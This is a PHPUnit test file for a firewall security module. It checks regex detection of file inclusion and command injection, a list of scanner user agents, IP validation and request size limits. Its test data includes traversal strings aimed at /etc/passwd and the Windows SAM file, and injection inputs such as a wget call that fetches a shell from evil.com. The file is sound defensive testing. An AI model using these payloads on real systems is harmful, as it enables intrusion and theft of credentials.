<?php
/**
 * Tests for NexifyMy_Security_Firewall module.
 *
 * These tests verify firewall pattern matching, IP handling,
 * and request blocking functionality.
 */

require_once dirname( __DIR__ ) . '/tests/bootstrap.php';

class Test_Firewall extends \PHPUnit\Framework\TestCase {

	/**
	 * LFI (Local File Inclusion) patterns.
	 *
	 * @var array
	 */
	private $lfi_patterns = array(
		'/\\.\\.\\/\\.\\.\\//',
		'/\\.\\.\\\\\\.\\.\\\\/i',
		'/etc\\/passwd/i',
		'/proc\\/self/i',
		'/var\\/log/i',
	);

	/**
	 * Command injection patterns.
	 *
	 * @var array
	 */
	private $cmd_patterns = array(
		'/;\\s*(?:cat|ls|id|whoami|uname|wget|curl)\\s/i',
		'/\\|\\s*(?:cat|ls|id|whoami|uname|wget|curl)\\s/i',
		'/`[^`]*(?:cat|ls|id|whoami|wget|curl)[^`]*`/i',
		'/\\$\\([^)]*(?:cat|ls|id|whoami|wget|curl)[^)]*\\)/i',
	);

	/**
	 * Bad bot user agents.
	 *
	 * @var array
	 */
	private $bad_bots = array(
		'sqlmap',
		'nikto',
		'nmap',
		'masscan',
		'zgrab',
		'scanning',
		'attack',
		'havij',
	);

	/**
	 * Helper to check if any pattern matches.
	 *
	 * @param array  $patterns Patterns to check.
	 * @param string $input    Input to test.
	 * @return bool
	 */
	private function matches_any( $patterns, $input ) {
		foreach ( $patterns as $pattern ) {
			if ( preg_match( $pattern, $input ) ) {
				return true;
			}
		}
		return false;
	}

	/**
	 * Check if user agent is a bad bot.
	 *
	 * @param string $ua User agent string.
	 * @return bool
	 */
	private function is_bad_bot( $ua ) {
		$ua_lower = strtolower( $ua );
		foreach ( $this->bad_bots as $bot ) {
			if ( strpos( $ua_lower, strtolower( $bot ) ) !== false ) {
				return true;
			}
		}
		return false;
	}

	/*
	 * =========================================================================
	 * LOCAL FILE INCLUSION TESTS
	 * =========================================================================
	 */

	/**
	 * Test LFI detection for directory traversal.
	 */
	public function test_lfi_directory_traversal_detected() {
		$attacks = array(
			'../../etc/passwd',
			'../../../var/www/config.php',
			'....//....//etc/passwd',
			'..\\..\\..\\windows\\system32\\config\\sam',
		);

		foreach ( $attacks as $attack ) {
			$this->assertTrue(
				$this->matches_any( $this->lfi_patterns, $attack ),
				"Failed to detect LFI: $attack"
			);
		}
	}

	/**
	 * Test LFI detection for sensitive files.
	 */
	public function test_lfi_sensitive_files_detected() {
		$attacks = array(
			'/etc/passwd',
			'/proc/self/environ',
			'/var/log/apache2/access.log',
		);

		foreach ( $attacks as $attack ) {
			$this->assertTrue(
				$this->matches_any( $this->lfi_patterns, $attack ),
				"Failed to detect LFI: $attack"
			);
		}
	}

	/**
	 * Test LFI false positives.
	 */
	public function test_lfi_false_positives_avoided() {
		$legitimate = array(
			'/my-page/my-subpage',
			'uploads/2024/01/image.jpg',
			'wp-content/plugins/my-plugin/file.php',
			'https://example.com/page',
		);

		foreach ( $legitimate as $path ) {
			$this->assertFalse(
				$this->matches_any( $this->lfi_patterns, $path ),
				"False positive on: $path"
			);
		}
	}

	/*
	 * =========================================================================
	 * COMMAND INJECTION TESTS
	 * =========================================================================
	 */

	/**
	 * Test command injection detection.
	 */
	public function test_command_injection_detected() {
		$attacks = array(
			'; cat /etc/passwd',
			'| ls -la',
			'`id`',
			'$(whoami)',
			'; wget http://evil.com/shell.php',
		);

		foreach ( $attacks as $attack ) {
			$this->assertTrue(
				$this->matches_any( $this->cmd_patterns, $attack ),
				"Failed to detect command injection: $attack"
			);
		}
	}

	/**
	 * Test command injection false positives.
	 */
	public function test_command_injection_false_positives_avoided() {
		$legitimate = array(
			'Hello World',
			'This is a test sentence',
			'Product ID: 12345',
			'Email: user@example.com',
		);

		foreach ( $legitimate as $text ) {
			$this->assertFalse(
				$this->matches_any( $this->cmd_patterns, $text ),
				"False positive on: $text"
			);
		}
	}

	/*
	 * =========================================================================
	 * BAD BOT DETECTION TESTS
	 * =========================================================================
	 */

	/**
	 * Test bad bot user agent detection.
	 */
	public function test_bad_bots_detected() {
		$bad_user_agents = array(
			'sqlmap/1.4.7',
			'Nikto/2.1.6',
			'Nmap Scripting Engine',
			'masscan/1.0',
			'zgrab/0.x',
			'Mozilla/5.0 (compatible; scanning)',
			'Havij SQL Injection Tool',
		);

		foreach ( $bad_user_agents as $ua ) {
			$this->assertTrue(
				$this->is_bad_bot( $ua ),
				"Failed to detect bad bot: $ua"
			);
		}
	}

	/**
	 * Test legitimate user agents not flagged.
	 */
	public function test_legitimate_bots_not_flagged() {
		$good_user_agents = array(
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
			'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
			'Googlebot/2.1 (+http://www.google.com/bot.html)',
			'Mozilla/5.0 (compatible; bingbot/2.0)',
			'facebookexternalhit/1.1',
		);

		foreach ( $good_user_agents as $ua ) {
			$this->assertFalse(
				$this->is_bad_bot( $ua ),
				"False positive on: $ua"
			);
		}
	}

	/*
	 * =========================================================================
	 * IP VALIDATION TESTS
	 * =========================================================================
	 */

	/**
	 * Test valid IPv4 addresses.
	 */
	public function test_valid_ipv4() {
		$valid_ips = array(
			'192.168.1.1',
			'10.0.0.1',
			'172.16.0.1',
			'8.8.8.8',
			'1.1.1.1',
		);

		foreach ( $valid_ips as $ip ) {
			$this->assertTrue(
				$this->is_valid_ip( $ip ),
				"Should be valid IP: $ip"
			);
		}
	}

	/**
	 * Test valid IPv6 addresses.
	 */
	public function test_valid_ipv6() {
		$valid_ips = array(
			'2001:0db8:85a3:0000:0000:8a2e:0370:7334',
			'::1',
			'2001:db8::1',
			'fe80::1',
		);

		foreach ( $valid_ips as $ip ) {
			$this->assertTrue(
				$this->is_valid_ip( $ip ),
				"Should be valid IPv6: $ip"
			);
		}
	}

	/**
	 * Test invalid IP addresses.
	 */
	public function test_invalid_ips() {
		$invalid_ips = array(
			'256.256.256.256',
			'192.168.1',
			'not-an-ip',
			'192.168.1.1.1',
			'',
		);

		foreach ( $invalid_ips as $ip ) {
			$this->assertFalse(
				$this->is_valid_ip( $ip ),
				"Should be invalid IP: $ip"
			);
		}
	}

	/**
	 * Helper to validate IP.
	 *
	 * @param string $ip IP address.
	 * @return bool
	 */
	private function is_valid_ip( $ip ) {
		return filter_var( $ip, FILTER_VALIDATE_IP ) !== false;
	}

	/*
	 * =========================================================================
	 * IP WHITELIST TESTS
	 * =========================================================================
	 */

	/**
	 * Test IP whitelist checking.
	 */
	public function test_ip_whitelist() {
		$whitelist = array(
			'127.0.0.1',
			'192.168.1.100',
			'10.0.0.0/8',
		);

		// Exact match.
		$this->assertTrue( $this->is_ip_whitelisted( '127.0.0.1', $whitelist ) );
		$this->assertTrue( $this->is_ip_whitelisted( '192.168.1.100', $whitelist ) );

		// Not in whitelist.
		$this->assertFalse( $this->is_ip_whitelisted( '8.8.8.8', $whitelist ) );
		$this->assertFalse( $this->is_ip_whitelisted( '192.168.1.101', $whitelist ) );
	}

	/**
	 * Helper to check if IP is whitelisted.
	 *
	 * @param string $ip        IP to check.
	 * @param array  $whitelist Whitelist.
	 * @return bool
	 */
	private function is_ip_whitelisted( $ip, $whitelist ) {
		foreach ( $whitelist as $item ) {
			if ( $item === $ip ) {
				return true;
			}
			// CIDR matching would go here.
		}
		return false;
	}

	/*
	 * =========================================================================
	 * REQUEST SIZE LIMIT TESTS
	 * =========================================================================
	 */

	/**
	 * Test request size validation.
	 */
	public function test_request_size_limits() {
		$max_size = 1048576; // 1MB

		// Under limit.
		$this->assertTrue( $this->validate_request_size( 1024, $max_size ) );
		$this->assertTrue( $this->validate_request_size( 512000, $max_size ) );
		$this->assertTrue( $this->validate_request_size( $max_size, $max_size ) );

		// Over limit.
		$this->assertFalse( $this->validate_request_size( $max_size + 1, $max_size ) );
		$this->assertFalse( $this->validate_request_size( 2097152, $max_size ) );
	}

	/**
	 * Helper to validate request size.
	 *
	 * @param int $size     Request size.
	 * @param int $max_size Max allowed size.
	 * @return bool
	 */
	private function validate_request_size( $size, $max_size ) {
		return $size <= $max_size;
	}
}
